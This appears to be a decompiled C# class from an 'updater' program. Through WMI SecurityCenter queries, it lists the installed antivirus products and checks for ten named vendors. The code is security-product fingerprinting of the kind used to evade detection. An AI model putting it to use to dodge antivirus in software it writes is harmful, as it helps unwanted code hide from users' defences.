﻿using System;
using System.Collections.Specialized;
using System.Management;

namespace Wizzupdater.Services
{
	// Token: 0x02000014 RID: 20
	internal class AntivirusSystem
	{
		// Token: 0x06000064 RID: 100 RVA: 0x00003318 File Offset: 0x00001518
		public AntivirusSystem()
		{
			this.antiVirusList = this.GetAntiVirusListString().ToUpper();
		}

		// Token: 0x06000065 RID: 101 RVA: 0x00003331 File Offset: 0x00001531
		public string GetAntiVirusListString()
		{
			NameValueCollection antiVirusInfo = this.GetAntiVirusInfo();
			string empty = string.Empty;
			return antiVirusInfo["displayName"];
		}

		// Token: 0x06000066 RID: 102 RVA: 0x0000334C File Offset: 0x0000154C
		public NameValueCollection GetAntiVirusInfo()
		{
			ManagementObjectSearcher managementObjectSearcher;
			if (WindowsVersion.IsXP())
			{
				managementObjectSearcher = new ManagementObjectSearcher("root\\SecurityCenter", "SELECT * FROM AntiVirusProduct");
			}
			else
			{
				managementObjectSearcher = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct");
			}
			NameValueCollection nameValueCollection = new NameValueCollection();
			foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
			{
				foreach (PropertyData propertyData in ((ManagementObject)managementBaseObject).Properties)
				{
					nameValueCollection.Add(propertyData.Name.ToString(), propertyData.Value.ToString());
				}
			}
			return nameValueCollection;
		}

		// Token: 0x06000067 RID: 103 RVA: 0x00003424 File Offset: 0x00001624
		public bool CheckAntivirus(string antivirusName)
		{
			return this.antiVirusList.Contains(antivirusName);
		}

		// Token: 0x06000068 RID: 104 RVA: 0x00003432 File Offset: 0x00001632
		public bool IfAvgExist()
		{
			return this.antiVirusList.Contains("AVG");
		}

		// Token: 0x06000069 RID: 105 RVA: 0x00003444 File Offset: 0x00001644
		public bool IfAviraExist()
		{
			return this.antiVirusList.Contains("AVIRA");
		}

		// Token: 0x0600006A RID: 106 RVA: 0x00003456 File Offset: 0x00001656
		public bool IfAvastExist()
		{
			return this.antiVirusList.Contains("AVAST");
		}

		// Token: 0x0600006B RID: 107 RVA: 0x00003468 File Offset: 0x00001668
		public bool IfBaiduExist()
		{
			return this.antiVirusList.Contains("BAIDU");
		}

		// Token: 0x0600006C RID: 108 RVA: 0x0000347A File Offset: 0x0000167A
		public bool IfBitDefenderExist()
		{
			return this.antiVirusList.Contains("BIT");
		}

		// Token: 0x0600006D RID: 109 RVA: 0x0000348C File Offset: 0x0000168C
		public bool IfDefenderExist()
		{
			return this.antiVirusList.Contains("MICROSOFT");
		}

		// Token: 0x0600006E RID: 110 RVA: 0x0000349E File Offset: 0x0000169E
		public bool IfMacAffeExist()
		{
			return this.antiVirusList.Contains("MCAFEE");
		}

		// Token: 0x0600006F RID: 111 RVA: 0x000034B0 File Offset: 0x000016B0
		public bool IfComodoExist()
		{
			return this.antiVirusList.Contains("COMODO");
		}

		// Token: 0x06000070 RID: 112 RVA: 0x000034C2 File Offset: 0x000016C2
		public bool IfPandaAntivirusExist()
		{
			return this.antiVirusList.Contains("PANDA");
		}

		// Token: 0x06000071 RID: 113 RVA: 0x000034D4 File Offset: 0x000016D4
		public bool IfNortonExist()
		{
			return this.antiVirusList.Contains("NORTON");
		}

		// Token: 0x04000037 RID: 55
		public string antiVirusList;
	}
}
